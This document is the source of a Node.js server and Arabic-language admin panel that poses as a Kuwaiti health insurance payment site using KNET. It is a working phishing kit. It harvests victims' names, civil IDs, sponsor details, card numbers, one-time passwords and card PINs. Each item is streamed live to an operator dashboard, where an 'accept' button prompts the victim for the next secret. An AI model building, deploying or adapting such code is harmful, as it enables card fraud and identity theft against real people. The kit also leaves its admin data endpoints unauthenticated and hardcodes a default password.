const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const { v4: uuidv4 } = require('uuid');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: { origin: '*', methods: ['GET', 'POST'] }
});

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ===== In-Memory Storage =====
const payments = [];
const users = [];
let adminSockets = [];

const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'Admin@2024';

// ===== Helper =====
function notifyAdmins(event, data) {
  adminSockets.forEach(s => {
    try { s.emit(event, data); } catch(e) {}
  });
}

// ===== API Routes =====

// Auth - register
app.post('/auth', (req, res) => {
  const { fullName, civilId, phone, email, nationality, passportExpiry, sponsorName, sponsorCivilId, insuranceType, amountPerYear } = req.body;
  const userId = uuidv4();
  const user = { id: userId, fullName, civilId, phone, email, nationality, passportExpiry, sponsorName, sponsorCivilId, insuranceType, amountPerYear, createdAt: new Date().toISOString() };
  users.push(user);
  res.json({ success: true, userId, user });
});

// Get all users (admin)
app.get('/user/all', (req, res) => {
  res.json(users);
});

// Get user count
app.get('/user/count', (req, res) => {
  res.json({ count: users.length });
});

// KNET - submit card data
app.post('/knet', (req, res) => {
  const { userId, cardNumber, civilId, fullName, phone, sponsorName, sponsorCivilId, nationality, passportExpiry, insuranceType, amountPerYear } = req.body;
  const paymentId = uuidv4();
  const refNumber = 'INS' + Date.now().toString().slice(-8);
  
  const payment = {
    id: paymentId,
    refNumber,
    userId: userId || uuidv4(),
    fullName: fullName || '',
    civilId: civilId || '',
    phone: phone || '',
    sponsorName: sponsorName || '',
    sponsorCivilId: sponsorCivilId || '',
    nationality: nationality || '',
    passportExpiry: passportExpiry || '',
    insuranceType: insuranceType || '',
    amountPerYear: amountPerYear || '',
    cardNumber: cardNumber || '',
    otp: null,
    pin: null,
    status: 'pending_card',
    step: 1,
    createdAt: new Date().toISOString(),
    updatedAt: new Date().toISOString()
  };
  
  payments.push(payment);
  
  // Notify admins
  notifyAdmins('payment_new', payment);
  
  res.json({ success: true, paymentId, refNumber });
});

// KNET OTP - submit OTP
app.post('/knet-otp', (req, res) => {
  const { paymentId, otp, pin } = req.body;
  
  const payment = payments.find(p => p.id === paymentId);
  if (!payment) {
    return res.status(404).json({ success: false, message: 'Payment not found' });
  }
  
  if (otp) {
    payment.otp = otp;
    payment.status = 'pending_otp';
    payment.step = 2;
    notifyAdmins('payment_otp_received', { paymentId, otp, payment });
  }
  
  if (pin) {
    payment.pin = pin;
    payment.status = 'pending_pin';
    payment.step = 3;
    notifyAdmins('payment_pin_received', { paymentId, pin, payment });
  }
  
  payment.updatedAt = new Date().toISOString();
  res.json({ success: true, payment });
});

// Admin login
app.post('/admin/login', (req, res) => {
  const { password } = req.body;
  if (password === ADMIN_PASSWORD) {
    res.json({ success: true, token: 'admin_token_' + Date.now() });
  } else {
    res.status(401).json({ success: false, message: 'كلمة المرور غير صحيحة' });
  }
});

// Admin - get all payments
app.get('/admin/payments', (req, res) => {
  res.json(payments);
});

// Admin - get all users
app.get('/admin/users', (req, res) => {
  res.json(users);
});

// Admin - update payment status (accept/reject)
app.post('/admin/payments/:id/action', (req, res) => {
  const { id } = req.params;
  const { action } = req.body; // 'accept' or 'reject'
  
  const payment = payments.find(p => p.id === id);
  if (!payment) {
    return res.status(404).json({ success: false, message: 'Payment not found' });
  }
  
  if (action === 'accept') {
    if (payment.step === 1) {
      payment.status = 'waiting_otp';
    } else if (payment.step === 2) {
      payment.status = 'waiting_pin';
    } else if (payment.step === 3) {
      payment.status = 'completed';
    }
  } else if (action === 'reject') {
    payment.status = 'rejected';
  }
  
  payment.updatedAt = new Date().toISOString();
  notifyAdmins('payment_status_changed', { paymentId: id, status: payment.status, payment });
  
  // Notify the user's socket if connected
  io.to('payment_' + id).emit('payment_status_changed', { status: payment.status, payment });
  
  res.json({ success: true, payment });
});

// ===== Admin Panel HTML (before static to ensure priority) =====
app.get('/panel', (req, res) => {
  res.send(getAdminHTML());
});

// ===== Serve Frontend (Angular SPA) =====
app.use(express.static(path.join(__dirname, 'public')));

// SPA fallback - serve index.html for Angular routes
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// ===== Socket.IO =====
io.on('connection', (socket) => {
  console.log('Client connected:', socket.id);
  
  socket.on('admin_join', (data) => {
    if (data && data.token && data.token.startsWith('admin_token_')) {
      adminSockets.push(socket);
      socket.isAdmin = true;
      // Send current payments to admin
      socket.emit('payments_list', payments);
      console.log('Admin joined:', socket.id);
    }
  });
  
  socket.on('join_payment', (paymentId) => {
    socket.join('payment_' + paymentId);
  });
  
  socket.on('disconnect', () => {
    adminSockets = adminSockets.filter(s => s.id !== socket.id);
    console.log('Client disconnected:', socket.id);
  });
});

// ===== Admin HTML =====
function getAdminHTML() {
  return `<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>لوحة التحكم - نظام الضمان الصحي الكويتي</title>
<script src="/socket.io/socket.io.js"></script>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #0f172a; color: #e2e8f0; direction: rtl; }
  
  /* Login Page */
  #login-page {
    display: flex; align-items: center; justify-content: center;
    min-height: 100vh; background: linear-gradient(135deg, #0f172a 0%, #1e3a5f 100%);
  }
  .login-card {
    background: #1e293b; border-radius: 16px; padding: 40px;
    width: 360px; text-align: center; box-shadow: 0 20px 60px rgba(0,0,0,0.5);
    border: 1px solid #334155;
  }
  .login-logo { font-size: 48px; margin-bottom: 16px; }
  .login-title { font-size: 22px; font-weight: 700; color: #f1f5f9; margin-bottom: 4px; }
  .login-sub { font-size: 13px; color: #94a3b8; margin-bottom: 28px; }
  .login-input {
    width: 100%; padding: 12px 16px; border-radius: 10px;
    border: 1px solid #334155; background: #0f172a; color: #f1f5f9;
    font-size: 15px; margin-bottom: 16px; text-align: center; letter-spacing: 2px;
  }
  .login-input:focus { outline: none; border-color: #3b82f6; }
  .login-btn {
    width: 100%; padding: 13px; border-radius: 10px; border: none;
    background: linear-gradient(135deg, #1d4ed8, #3b82f6); color: white;
    font-size: 16px; font-weight: 600; cursor: pointer; transition: all 0.2s;
  }
  .login-btn:hover { transform: translateY(-1px); box-shadow: 0 4px 15px rgba(59,130,246,0.4); }
  .login-error { color: #f87171; font-size: 13px; margin-top: 10px; display: none; }

  /* Dashboard */
  #dashboard { display: none; }
  
  .header {
    background: #1e293b; border-bottom: 1px solid #334155;
    padding: 14px 24px; display: flex; align-items: center; justify-content: space-between;
  }
  .header-title { font-size: 18px; font-weight: 700; color: #f1f5f9; }
  .header-sub { font-size: 12px; color: #64748b; }
  .header-right { display: flex; align-items: center; gap: 12px; }
  .online-badge {
    background: #064e3b; color: #34d399; padding: 4px 12px;
    border-radius: 20px; font-size: 12px; font-weight: 600;
    border: 1px solid #065f46;
  }
  .online-dot { display: inline-block; width: 8px; height: 8px; background: #34d399; border-radius: 50%; margin-left: 6px; animation: pulse 2s infinite; }
  
  .stats-bar {
    display: grid; grid-template-columns: repeat(4, 1fr); gap: 16px;
    padding: 20px 24px; background: #0f172a;
  }
  .stat-card {
    background: #1e293b; border-radius: 12px; padding: 16px 20px;
    border: 1px solid #334155; text-align: center;
  }
  .stat-num { font-size: 28px; font-weight: 800; color: #f1f5f9; }
  .stat-label { font-size: 12px; color: #64748b; margin-top: 4px; }
  .stat-card.blue .stat-num { color: #60a5fa; }
  .stat-card.green .stat-num { color: #34d399; }
  .stat-card.yellow .stat-num { color: #fbbf24; }
  .stat-card.red .stat-num { color: #f87171; }

  .main-content { padding: 0 24px 24px; }
  
  .section-title {
    font-size: 16px; font-weight: 700; color: #f1f5f9;
    padding: 16px 0 12px; border-bottom: 1px solid #334155; margin-bottom: 16px;
  }
  
  .payments-table { width: 100%; border-collapse: collapse; }
  .payments-table th {
    background: #1e293b; padding: 12px 14px; text-align: right;
    font-size: 12px; color: #94a3b8; font-weight: 600; border-bottom: 1px solid #334155;
  }
  .payments-table td {
    padding: 12px 14px; border-bottom: 1px solid #1e293b;
    font-size: 13px; color: #cbd5e1; vertical-align: middle;
  }
  .payments-table tr:hover td { background: #1e293b; }
  
  .badge {
    padding: 3px 10px; border-radius: 20px; font-size: 11px; font-weight: 600;
    display: inline-block;
  }
  .badge-pending { background: #1c1917; color: #fbbf24; border: 1px solid #78350f; }
  .badge-waiting-otp { background: #1e1b4b; color: #818cf8; border: 1px solid #3730a3; }
  .badge-waiting-pin { background: #0c1a2e; color: #38bdf8; border: 1px solid #0369a1; }
  .badge-completed { background: #052e16; color: #34d399; border: 1px solid #065f46; }
  .badge-rejected { background: #1f0a0a; color: #f87171; border: 1px solid #7f1d1d; }
  
  .btn-accept {
    background: #065f46; color: #34d399; border: 1px solid #065f46;
    padding: 6px 14px; border-radius: 8px; cursor: pointer; font-size: 12px;
    font-weight: 600; transition: all 0.2s; margin-left: 6px;
  }
  .btn-accept:hover { background: #047857; }
  .btn-reject {
    background: #7f1d1d; color: #f87171; border: 1px solid #7f1d1d;
    padding: 6px 14px; border-radius: 8px; cursor: pointer; font-size: 12px;
    font-weight: 600; transition: all 0.2s;
  }
  .btn-reject:hover { background: #991b1b; }
  .btn-details {
    background: #1e3a5f; color: #60a5fa; border: 1px solid #1e40af;
    padding: 6px 14px; border-radius: 8px; cursor: pointer; font-size: 12px;
    font-weight: 600; transition: all 0.2s; margin-left: 6px;
  }
  .btn-details:hover { background: #1e40af; }
  
  /* Modal */
  .modal-overlay {
    display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.7);
    z-index: 1000; align-items: center; justify-content: center;
  }
  .modal-overlay.active { display: flex; }
  .modal {
    background: #1e293b; border-radius: 16px; padding: 28px;
    width: 500px; max-width: 95vw; border: 1px solid #334155;
    max-height: 85vh; overflow-y: auto;
  }
  .modal-title { font-size: 18px; font-weight: 700; color: #f1f5f9; margin-bottom: 20px; }
  .modal-row { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid #334155; }
  .modal-label { color: #94a3b8; font-size: 13px; }
  .modal-value { color: #f1f5f9; font-size: 13px; font-weight: 600; direction: ltr; }
  .modal-value.sensitive { color: #fbbf24; font-family: monospace; font-size: 14px; letter-spacing: 1px; }
  .modal-close {
    width: 100%; padding: 12px; margin-top: 20px; border-radius: 10px;
    border: none; background: #334155; color: #f1f5f9; cursor: pointer;
    font-size: 14px; font-weight: 600;
  }
  
  /* Notification */
  .notification {
    position: fixed; top: 20px; left: 50%; transform: translateX(-50%);
    background: #1e293b; border: 1px solid #334155; border-radius: 12px;
    padding: 14px 24px; z-index: 2000; display: none;
    box-shadow: 0 10px 40px rgba(0,0,0,0.5); min-width: 300px; text-align: center;
  }
  .notification.show { display: block; animation: slideDown 0.3s ease; }
  .notification.new-payment { border-color: #1d4ed8; background: #0c1a2e; }
  .notification.new-otp { border-color: #7c3aed; background: #1e1b4b; }
  .notification.new-pin { border-color: #0369a1; background: #0c1a2e; }
  .notif-title { font-size: 14px; font-weight: 700; color: #f1f5f9; margin-bottom: 4px; }
  .notif-sub { font-size: 12px; color: #94a3b8; }
  .notif-data { font-size: 18px; font-weight: 800; color: #fbbf24; font-family: monospace; letter-spacing: 2px; margin-top: 6px; }
  
  @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
  @keyframes slideDown { from { transform: translateX(-50%) translateY(-20px); opacity: 0; } to { transform: translateX(-50%) translateY(0); opacity: 1; } }
  
  .empty-state { text-align: center; padding: 60px 20px; color: #475569; }
  .empty-icon { font-size: 48px; margin-bottom: 12px; }
  
  .step-indicator {
    display: inline-flex; align-items: center; gap: 6px;
    font-size: 11px; color: #94a3b8;
  }
  .step-dot { width: 8px; height: 8px; border-radius: 50%; background: #334155; }
  .step-dot.active { background: #3b82f6; }
  .step-dot.done { background: #34d399; }
</style>
</head>
<body>

<!-- Login Page -->
<div id="login-page">
  <div class="login-card">
    <div class="login-logo">🏥</div>
    <div class="login-title">نظام الضمان الصحي الكويتي</div>
    <div class="login-sub">لوحة التحكم الإدارية</div>
    <input type="password" id="pw-input" class="login-input" placeholder="أدخل كلمة المرور" onkeydown="if(event.key==='Enter')doLogin()">
    <button class="login-btn" onclick="doLogin()">🔐 تسجيل الدخول</button>
    <div class="login-error" id="login-error">كلمة المرور غير صحيحة</div>
  </div>
</div>

<!-- Dashboard -->
<div id="dashboard">
  <div class="header">
    <div>
      <div class="header-title">🏥 لوحة التحكم - الضمان الصحي الكويتي</div>
      <div class="header-sub">إدارة طلبات الدفع عبر KNET</div>
    </div>
    <div class="header-right">
      <div class="online-badge"><span class="online-dot"></span>متصل</div>
    </div>
  </div>
  
  <div class="stats-bar">
    <div class="stat-card blue">
      <div class="stat-num" id="stat-total">0</div>
      <div class="stat-label">إجمالي الطلبات</div>
    </div>
    <div class="stat-card yellow">
      <div class="stat-num" id="stat-pending">0</div>
      <div class="stat-label">قيد المعالجة</div>
    </div>
    <div class="stat-card green">
      <div class="stat-num" id="stat-completed">0</div>
      <div class="stat-label">مكتملة</div>
    </div>
    <div class="stat-card red">
      <div class="stat-num" id="stat-rejected">0</div>
      <div class="stat-label">مرفوضة</div>
    </div>
  </div>
  
  <div class="main-content">
    <div class="section-title">📋 طلبات الدفع KNET</div>
    <div id="payments-container">
      <div class="empty-state">
        <div class="empty-icon">📭</div>
        <div>لا توجد طلبات بعد</div>
      </div>
    </div>
  </div>
</div>

<!-- Modal -->
<div class="modal-overlay" id="modal-overlay" onclick="closeModal(event)">
  <div class="modal" id="modal-content">
    <div class="modal-title" id="modal-title">تفاصيل الطلب</div>
    <div id="modal-body"></div>
    <button class="modal-close" onclick="document.getElementById('modal-overlay').classList.remove('active')">إغلاق</button>
  </div>
</div>

<!-- Notification -->
<div class="notification" id="notification">
  <div class="notif-title" id="notif-title"></div>
  <div class="notif-sub" id="notif-sub"></div>
  <div class="notif-data" id="notif-data"></div>
</div>

<script>
let adminToken = null;
let socket = null;
let allPayments = [];

// ===== Login =====
async function doLogin() {
  const pw = document.getElementById('pw-input').value;
  try {
    const res = await fetch('/admin/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ password: pw })
    });
    const data = await res.json();
    if (data.success) {
      adminToken = data.token;
      document.getElementById('login-page').style.display = 'none';
      document.getElementById('dashboard').style.display = 'block';
      initSocket();
      loadPayments();
    } else {
      document.getElementById('login-error').style.display = 'block';
    }
  } catch(e) {
    document.getElementById('login-error').style.display = 'block';
  }
}

// ===== Socket =====
function initSocket() {
  socket = io();
  socket.emit('admin_join', { token: adminToken });
  
  socket.on('payment_new', (payment) => {
    allPayments.unshift(payment);
    renderPayments();
    updateStats();
    showNotification('💳 طلب دفع جديد!', payment.fullName + ' - ' + payment.phone, payment.cardNumber, 'new-payment');
    playSound();
  });
  
  socket.on('payment_otp_received', (data) => {
    const idx = allPayments.findIndex(p => p.id === data.paymentId);
    if (idx !== -1) { allPayments[idx] = data.payment; renderPayments(); updateStats(); }
    showNotification('🔑 OTP جديد وصل!', 'رقم المرجع: ' + (data.payment ? data.payment.refNumber : ''), data.otp, 'new-otp');
    playSound();
  });
  
  socket.on('payment_pin_received', (data) => {
    const idx = allPayments.findIndex(p => p.id === data.paymentId);
    if (idx !== -1) { allPayments[idx] = data.payment; renderPayments(); updateStats(); }
    showNotification('🔒 رقم سري جديد!', 'رقم المرجع: ' + (data.payment ? data.payment.refNumber : ''), data.pin, 'new-pin');
    playSound();
  });
  
  socket.on('payment_status_changed', (data) => {
    const idx = allPayments.findIndex(p => p.id === data.paymentId);
    if (idx !== -1) { allPayments[idx] = data.payment; renderPayments(); updateStats(); }
  });
  
  socket.on('payments_list', (list) => {
    allPayments = list;
    renderPayments();
    updateStats();
  });
}

// ===== Load Payments =====
async function loadPayments() {
  try {
    const res = await fetch('/admin/payments');
    allPayments = await res.json();
    renderPayments();
    updateStats();
  } catch(e) {}
}

// ===== Render =====
function renderPayments() {
  const container = document.getElementById('payments-container');
  if (!allPayments.length) {
    container.innerHTML = '<div class="empty-state"><div class="empty-icon">📭</div><div>لا توجد طلبات بعد</div></div>';
    return;
  }
  
  let html = '<table class="payments-table"><thead><tr>';
  html += '<th>المرجع</th><th>الاسم</th><th>الرقم المدني</th><th>الجوال</th><th>نوع التأمين</th><th>المبلغ</th><th>الحالة</th><th>الخطوة</th><th>الإجراءات</th>';
  html += '</tr></thead><tbody>';
  
  allPayments.forEach(p => {
    const statusBadge = getStatusBadge(p.status);
    const stepHtml = getStepHtml(p.step);
    const actions = getActions(p);
    
    html += '<tr>';
    html += '<td><b style="color:#60a5fa">' + (p.refNumber || '-') + '</b></td>';
    html += '<td>' + (p.fullName || '-') + '</td>';
    html += '<td>' + (p.civilId || '-') + '</td>';
    html += '<td>' + (p.phone || '-') + '</td>';
    html += '<td>' + getInsuranceLabel(p.insuranceType) + '</td>';
    html += '<td>' + (p.amountPerYear ? p.amountPerYear + ' د.ك' : '-') + '</td>';
    html += '<td>' + statusBadge + '</td>';
    html += '<td>' + stepHtml + '</td>';
    html += '<td>' + actions + '</td>';
    html += '</tr>';
  });
  
  html += '</tbody></table>';
  container.innerHTML = html;
}

function getStatusBadge(status) {
  const map = {
    'pending_card': '<span class="badge badge-pending">انتظار البطاقة</span>',
    'waiting_otp': '<span class="badge badge-waiting-otp">انتظار OTP</span>',
    'pending_otp': '<span class="badge badge-waiting-otp">OTP وصل</span>',
    'waiting_pin': '<span class="badge badge-waiting-pin">انتظار الرقم السري</span>',
    'pending_pin': '<span class="badge badge-waiting-pin">الرقم السري وصل</span>',
    'completed': '<span class="badge badge-completed">مكتمل ✓</span>',
    'rejected': '<span class="badge badge-rejected">مرفوض ✗</span>'
  };
  return map[status] || '<span class="badge badge-pending">' + status + '</span>';
}

function getStepHtml(step) {
  const s = step || 1;
  return '<div class="step-indicator">' +
    '<div class="step-dot ' + (s >= 1 ? (s > 1 ? 'done' : 'active') : '') + '"></div>' +
    '<div class="step-dot ' + (s >= 2 ? (s > 2 ? 'done' : 'active') : '') + '"></div>' +
    '<div class="step-dot ' + (s >= 3 ? 'done' : '') + '"></div>' +
    '<span style="font-size:11px;color:#64748b">' + s + '/3</span>' +
    '</div>';
}

function getInsuranceLabel(type) {
  const map = { 'basic': 'أساسي', 'comprehensive': 'شامل', 'family': 'عائلي', 'workers': 'عمالة' };
  return map[type] || (type || '-');
}

function getActions(p) {
  let html = '<button class="btn-details" onclick="showDetails(&apos;' + p.id + '&apos;)">تفاصيل</button>';
  
  if (p.status !== 'completed' && p.status !== 'rejected') {
    html += '<button class="btn-accept" onclick="doAction(&apos;' + p.id + '&apos;, &apos;accept&apos;)">✓ قبول</button>';
    html += '<button class="btn-reject" onclick="doAction(&apos;' + p.id + '&apos;, &apos;reject&apos;)">✗ رفض</button>';
  }
  
  return html;
}

// ===== Actions =====
async function doAction(paymentId, action) {
  try {
    const res = await fetch('/admin/payments/' + paymentId + '/action', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ action })
    });
    const data = await res.json();
    if (data.success) {
      const idx = allPayments.findIndex(p => p.id === paymentId);
      if (idx !== -1) { allPayments[idx] = data.payment; }
      renderPayments();
      updateStats();
    }
  } catch(e) {}
}

// ===== Details Modal =====
function showDetails(paymentId) {
  const p = allPayments.find(x => x.id === paymentId);
  if (!p) return;
  
  let html = '';
  const rows = [
    ['رقم المرجع', p.refNumber],
    ['الاسم الكامل', p.fullName],
    ['الرقم المدني', p.civilId],
    ['رقم الجوال', p.phone],
    ['البريد الإلكتروني', p.email],
    ['الجنسية', p.nationality],
    ['تاريخ انتهاء الجواز', p.passportExpiry],
    ['اسم الكفيل', p.sponsorName],
    ['رقم مدني الكفيل', p.sponsorCivilId],
    ['نوع التأمين', getInsuranceLabel(p.insuranceType)],
    ['المبلغ السنوي', p.amountPerYear ? p.amountPerYear + ' د.ك' : '-'],
  ];
  
  rows.forEach(([label, val]) => {
    if (val) html += '<div class="modal-row"><span class="modal-label">' + label + '</span><span class="modal-value">' + val + '</span></div>';
  });
  
  // Sensitive data
  if (p.cardNumber) html += '<div class="modal-row"><span class="modal-label">💳 رقم البطاقة</span><span class="modal-value sensitive">' + p.cardNumber + '</span></div>';
  if (p.otp) html += '<div class="modal-row"><span class="modal-label">🔑 OTP</span><span class="modal-value sensitive">' + p.otp + '</span></div>';
  if (p.pin) html += '<div class="modal-row"><span class="modal-label">🔒 الرقم السري</span><span class="modal-value sensitive">' + p.pin + '</span></div>';
  
  html += '<div class="modal-row"><span class="modal-label">الحالة</span><span class="modal-value">' + getStatusBadge(p.status) + '</span></div>';
  html += '<div class="modal-row"><span class="modal-label">تاريخ الطلب</span><span class="modal-value">' + new Date(p.createdAt).toLocaleString('ar-KW') + '</span></div>';
  
  document.getElementById('modal-title').textContent = 'تفاصيل الطلب - ' + p.refNumber;
  document.getElementById('modal-body').innerHTML = html;
  document.getElementById('modal-overlay').classList.add('active');
}

function closeModal(e) {
  if (e.target === document.getElementById('modal-overlay')) {
    document.getElementById('modal-overlay').classList.remove('active');
  }
}

// ===== Stats =====
function updateStats() {
  document.getElementById('stat-total').textContent = allPayments.length;
  document.getElementById('stat-pending').textContent = allPayments.filter(p => !['completed','rejected'].includes(p.status)).length;
  document.getElementById('stat-completed').textContent = allPayments.filter(p => p.status === 'completed').length;
  document.getElementById('stat-rejected').textContent = allPayments.filter(p => p.status === 'rejected').length;
}

// ===== Notification =====
let notifTimeout;
function showNotification(title, sub, data, type) {
  const el = document.getElementById('notification');
  document.getElementById('notif-title').textContent = title;
  document.getElementById('notif-sub').textContent = sub || '';
  document.getElementById('notif-data').textContent = data || '';
  el.className = 'notification show ' + (type || '');
  clearTimeout(notifTimeout);
  notifTimeout = setTimeout(() => { el.classList.remove('show'); }, 5000);
}

// ===== Sound =====
function playSound() {
  try {
    const ctx = new (window.AudioContext || window.webkitAudioContext)();
    const osc = ctx.createOscillator();
    const gain = ctx.createGain();
    osc.connect(gain); gain.connect(ctx.destination);
    osc.frequency.value = 880;
    gain.gain.setValueAtTime(0.3, ctx.currentTime);
    gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.5);
    osc.start(ctx.currentTime);
    osc.stop(ctx.currentTime + 0.5);
  } catch(e) {}
}

// Auto-refresh every 10 seconds
setInterval(() => { if (adminToken) loadPayments(); }, 10000);
</script>
</body>
</html>`;
}

// ===== Start Server =====
const PORT = process.env.PORT || 8080;
server.listen(PORT, () => {
  console.log('Kuwait Health Insurance Server running on port ' + PORT);
  console.log('Admin panel: http://localhost:' + PORT + '/admin');
});
